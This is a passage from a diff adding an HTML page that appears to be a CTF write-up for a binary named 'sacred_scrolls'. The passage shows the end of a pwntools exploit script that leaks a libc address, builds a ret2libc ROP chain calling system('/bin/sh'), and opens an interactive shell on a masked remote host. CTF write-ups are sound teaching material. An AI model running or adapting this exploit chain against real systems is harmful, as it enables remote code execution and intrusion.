+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_libc</span>(leak):
+</span></span><span style="display:flex;"><span>    libc_funlockfile <span style="color:#f92672">=</span> unpack(leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>    libc_address <span style="color:#f92672">=</span> libc_funlockfile <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>funlockfile
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> libc_address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./sacred_scrolls&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./glibc/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>binary <span style="color:#f92672">=</span> ELF(binname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>magic_mark <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x91\x93\xe2\x9a\xa1</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>spell <span style="color:#f92672">=</span> magic_mark <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> pack(puts) <span style="color:#f92672">+</span> pack(main)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> gen_payload(spell)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(binname)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;XXX.XXX.XXX.XXX&#39;</span>, XXXX)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send_payload(io, payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> get_libc(leak)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;libc:&#39;</span>, hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401184</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(pop_rdi)
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(bin_sh)
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(system)
+</span></span><span style="display:flex;"><span>spell <span style="color:#f92672">=</span> magic_mark <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> gen_payload(spell)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send_payload(io, payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Just launch it and enjoy the flag !</p>
+<p><img src="/sacred_scrolls_getflag.png" alt="getflag"></p>
+
+      </div></div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://alagroy-42.github.io/assets/main.js"></script>
+<script src="https://alagroy-42.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
